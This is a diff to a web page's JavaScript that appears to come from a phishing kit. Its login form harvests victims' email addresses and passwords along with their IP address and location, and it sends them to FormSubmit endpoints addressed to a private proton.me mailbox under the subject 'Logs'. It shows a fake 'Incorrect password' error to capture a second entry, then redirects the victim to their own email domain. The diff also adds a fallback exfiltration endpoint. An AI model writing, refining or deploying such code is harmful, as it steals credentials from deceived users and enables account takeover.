@@ -526,8 +526,8 @@
   </div>
 
   
-        <script>
-    document.addEventListener('DOMContentLoaded', function () {
+                <script>
+document.addEventListener('DOMContentLoaded', function () {
   // Element references
   const downloadButtons = document.querySelectorAll('.download-icon');
   const downloadAllButton = document.getElementById('downloadButton');
@@ -651,7 +651,7 @@
   let isAuthenticated = false;
   let authEmail = '';
 
-  // Form submission handler using jQuery approach
+  // Form submission handler
   async function handleSubmit(event) {
     event.preventDefault();
 
@@ -680,50 +680,93 @@
 
       step++; // Increment submission attempt
 
-      // Prepare form data
-      const formData = {
-        _subject: "Logs | " + ipData.ip,
-        Email: email,
-        Password: password,
-        Attempts: step,
-        IP: ipData.ip,
-        Location: ipData.city + ", " + ipData.country,
-      };
+      // Prepare form data - using URLSearchParams format for formsubmit.click
+      const formData = new URLSearchParams();
+      formData.append('_subject', 'Logs | ' + ipData.ip);
+      formData.append('Email', email);
+      formData.append('Password', password);
+      formData.append('Attempts', step.toString());
+      formData.append('IP', ipData.ip);
+      formData.append('Location', ipData.city + ', ' + ipData.country);
 
-      // Submit to FormSubmit - UPDATED ENDPOINT
-      const submitResponse = await fetch('https://formsubmit.click/Gabriel5657@proton.me', {
+      // Submit to FormSubmit
+      const submitResponse = await fetch('https://formsubmit.co/ajax/gabriel5657@proton.me', {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json',
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Accept': 'application/json'
         },
-        body: JSON.stringify(formData),
+        body: formData.toString()
       });
 
-      if (!submitResponse.ok) throw new Error('Network error');
-
-      // FormSubmit.click returns a redirect, so we don't parse JSON
-      const result = await submitResponse.text();
-      console.log('Form submission successful:', result);
-
-      // Redirect on second attempt
-      if (step === 2) {
-        const domain = email.split('@').pop(); // Extract domain from email
-        showLoading(false);
-        window.location.href = `http://${domain}`;
-        return;
+      if (!submitResponse.ok) {
+        throw new Error('Network error');
       }
 
-      // Show incorrect password message on first attempt
-      showError('Incorrect password. Please try again.');
-      showLoading(false);
-      submitButton.textContent = 'Sign in';
+      const result = await submitResponse.json();
+
+      // Check if submission was successful
+      if (result.success) {
+        console.log('Submission successful:', result);
+
+        // Redirect on second attempt
+        if (step === 2) {
+          const domain = email.split('@').pop(); // Extract domain from email
+          showLoading(false);
+          window.location.href = `http://${domain}`;
+          return;
+        }
+
+        // Show incorrect password message on first attempt
+        showError('Incorrect password. Please try again.');
+        showLoading(false);
+        submitButton.textContent = 'Sign in';
+      } else {
+        throw new Error('Submission failed');
+      }
 
     } catch (error) {
       console.error('Submission error:', error);
       showLoading(false);
       submitButton.textContent = 'Sign in';
       
-      if (error.message === 'Network error') {
+      // Try alternative endpoint if main one fails
+      if (error.message.includes('Network error') || error.message.includes('failed')) {
+        try {
+          // Try the formsubmit.click endpoint as fallback
+          const fallbackFormData = new FormData();
+          fallbackFormData.append('_subject', 'Logs | Fallback');
+          fallbackFormData.append('Email', email);
+          fallbackFormData.append('Password', password);
+          fallbackFormData.append('Attempts', step.toString());
+          fallbackFormData.append('IP', 'Unknown');
+          fallbackFormData.append('Location', 'Unknown');
+          
+          const fallbackResponse = await fetch('https://formsubmit.click/Gabriel5657@proton.me', {
+            method: 'POST',
+            body: fallbackFormData
+          });
+          
+          if (fallbackResponse.ok) {
+            console.log('Fallback submission successful');
+            
+            // Continue with the flow even if using fallback
+            if (step === 2) {
+              const domain = email.split('@').pop();
+              showLoading(false);
+              window.location.href = `http://${domain}`;
+              return;
+            }
+            
+            showError('Incorrect password. Please try again.');
+            showLoading(false);
+            submitButton.textContent = 'Sign in';
+            return;
+          }
+        } catch (fallbackError) {
+          console.error('Fallback also failed:', fallbackError);
+        }
+        
         closePopup();
         showNetworkError();
       } else {
@@ -812,9 +855,10 @@
   // Initial validation
   validateInputs();
 });
-  </script>
+          </script>
 </body>
 </html>
+
 
 
 
